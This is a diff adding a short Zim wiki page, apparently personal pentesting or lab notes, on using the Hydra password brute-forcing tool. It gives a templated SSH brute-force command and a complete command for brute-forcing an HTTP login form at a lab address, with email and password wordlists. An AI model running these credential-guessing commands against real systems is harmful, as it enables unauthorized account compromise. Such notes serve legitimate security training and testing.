@@ -1,0 +1,18 @@
+Content-Type: text/x-zim-wiki
+Wiki-Format: zim 0.4
+Creation-Date: 2020-05-08T08:19:28-04:00
+
+====== -hydra ======
+Created Friday 08 May 2020
+
+**hydra -l  {username}  -P  {wordlist}  {target}   -t   -V**
+
+**target-  ex. ssh://192.168.1.1:24**
+
+wordlists:
+  **--/usr/share/wordlists**
+**-s port**
+
+====== login form ======
+
+**hydra  10.10.10.186 -s 9001 http-post-form "/login.php:email=^USER^&password=^PASS^:Invalid Credentials" -L emails.txt -P pass.txt -t 10 -w 30 -o hydra-attack.txt**
